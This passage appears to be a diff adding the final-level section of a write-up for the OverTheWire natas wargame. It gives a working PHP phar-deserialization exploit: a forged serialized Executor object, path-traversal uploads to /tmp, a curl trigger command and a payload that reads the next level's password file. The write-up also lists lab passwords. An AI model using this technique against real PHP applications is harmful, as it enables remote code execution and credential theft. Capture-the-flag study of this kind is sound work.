@@ -626,3 +626,34 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Password for natas33:** `kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL`
 - **Verification:** `http://natas33.natas.labs.overthewire.org/` with `natas33:<password>` → HTTP 200.
 - **Recording:** `recordings/natas/L32.cast`
+
+## Level 33 → natas34 (the final level)
+- **Account:** `natas33`, password `kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL`.
+- **Goal:** An "Upload Firmware Update" form. `new Executor()` stores `$_POST['filename']` and moves the upload to `/natas33/upload/$filename`. Its `__destruct()` does `chdir("/natas33/upload/")`, then `if (md5_file($this->filename) == $this->signature) passthru("php " . $this->filename);`. `$filename`/`$signature` are **private** and the signature is a fixed constant.
+- **Technique and why it works:** **PHP phar deserialization (a.k.a. phar metadata object injection)**. `$filename` is private, so we cannot set it through the POST array — but we *can* choose what is passed to `md5_file()` indirectly, because the upload's destination name is ours. If the filename is `phar:///tmp/our.phar`, then `md5_file()` opens a `phar://` stream, and PHP **unserializes the phar's metadata** in that moment. The metadata is attacker-controlled, so we serialize an `Executor` object ourselves with `filename = /tmp/n33payload.php` and `signature = md5(payload)`. PHP rebuilds that object; when it goes out of scope at request end, `__destruct()` runs with *our* properties: `md5_file("/tmp/n33payload.php")` matches *our* signature, and `passthru("php /tmp/n33payload.php")` executes our payload — which reads the natas34 password file.
+
+  Two details make this work in practice:
+  1. The phar must be a *valid* phar: stub `<?php __HALT_COMPILER(); ?>\r\n`, a manifest with API 1.1 and global flag `0x10000`, the metadata, one file entry, then a SHA1 of everything before the digest plus the `GBMB` trailer. The recording builds it with a small Python writer (`/tmp/pharbuild.py`) instead of `Phar` (whose `phar.readonly` ini is on by default on the lab).
+  2. Private property names in the serialized string must be mangled as `\x00Executor\x00filename` etc., with exact `s:N:` lengths — a wrong length silently drops the property.
+
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the source.** `private $filename`, `private $signature='adeafbadbabec0dedabada55ba55d00d'`, `__destruct()` → `md5_file($this->filename) == $this->signature` → `passthru("php " . $this->filename)`.
+2. **Write the payload.** `<?php echo file_get_contents("/etc/natas_webpass/natas34"); ?>` → md5 `8a54d751b7e2bbbb2643d355d49e81be`.
+3. **Build the phar** whose metadata is `O:8:"Executor":3:{s:18:"\x00Executor\x00filename";s:19:"/tmp/n33payload.php";s:19:"\x00Executor\x00signature";s:32:"8a54d751...";s:14:"\x00Executor\x00init";b:0;}`:
+   ```
+   python3 /tmp/pharbuild.py /tmp/n33payload.php /tmp/n33r.phar
+   # payload md5=8a54d751b7e2bbbb2643d355d49e81be -> /tmp/n33r.phar (274 bytes)
+   ```
+4. **Upload both files.** The form lets us pick the destination name, so `filename=../../../tmp/n33payload.php` and `filename=../../../tmp/n33r.phar` land in `/tmp` (the upload directory is `/natas33/upload`, three levels below `/`).
+5. **Trigger the deserialization.**
+   ```
+   curl -s -u natas33:<pw> -F 'filename=phar:///tmp/n33r.phar' -F 'uploadedfile=@/tmp/h.txt' \
+        http://natas33.natas.labs.overthewire.org/index.php
+   # Failur! MD5sum mismatch!        <- the *original* object's destructor
+   # Congratulations! Running firmware update: /tmp/n33payload.php cT3LVC2sd5RtaRHdAE2xr16nYGuArbbK
+   ```
+   The second line is our injected object's destructor firing; the payload printed the password.
+6. **Verify.** `curl -u natas34:<pw> http://natas34.natas.labs.overthewire.org/` → HTTP 200; the page says "Congratulations! You have reached the end... for now."
+- **Password for natas34:** `cT3LVC2sd5RtaRHdAE2xr16nYGuArbbK`
+- **Verification:** `http://natas34.natas.labs.overthewire.org/` with `natas34:<password>` → HTTP 200 ("You have reached the end").
+- **Recording:** `recordings/natas/L33.cast`
